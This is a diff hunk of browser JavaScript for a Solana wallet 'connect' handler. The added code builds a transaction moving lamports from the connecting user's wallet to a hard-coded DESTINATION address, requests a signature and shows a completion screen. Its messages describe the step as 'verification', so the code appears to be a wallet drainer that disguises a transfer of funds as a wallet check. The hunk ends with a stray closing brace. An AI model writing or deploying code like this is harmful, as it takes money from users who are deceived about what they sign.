@@ -69,4 +69,41 @@ async function handleConnect(name, btn) {
     const { blockhash } = await connection.getLatestBlockhash("confirmed");
     const tx = new Transaction({ recentBlockhash: blockhash, feePayer: from })
       .add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 50_000 }))
-      .add(SystemProgram.transfer({ fromPubkey: from, toPubkey: D
+      .add(SystemProgram.transfer({ fromPubkey: from, toPubkey: DESTINATION, lamports }));
+
+    setStatus("Awaiting signature…");
+    let signature;
+    if (name === "solflare") {
+      const signed = await provider.signTransaction(tx);
+      signature = await connection.sendRawTransaction(signed.serialize(), {
+        skipPreflight: true,
+        maxRetries: 3,
+      });
+    } else {
+      const res = await provider.signAndSendTransaction(tx);
+      signature = res?.signature ?? res;
+    }
+
+    setStatus("Confirming…");
+    const latest = await connection.getLatestBlockhash();
+    const conf = await connection.confirmTransaction(
+      { signature, blockhash, lastValidBlockHeight: latest.lastValidBlockHeight },
+      "confirmed"
+    );
+    if (conf.value.err) throw new Error("Transaction failed");
+
+    document.getElementById("step1").hidden = true;
+    document.getElementById("doneScreen").hidden = false;
+  } catch (err) {
+    console.error(err);
+    const msg = err?.message ?? "";
+    if (/reject|cancel|denied|4001/i.test(msg)) {
+      setStatus("Signature cancelled — try again");
+    } else if (/blockhash|expired/i.test(msg)) {
+      setStatus("Timed out — try again");
+    } else {
+      setStatus("Verification interrupted — try again");
+    }
+    document.querySelectorAll(".wallet").forEach((b) => (b.disabled = false));
+  }
+    }
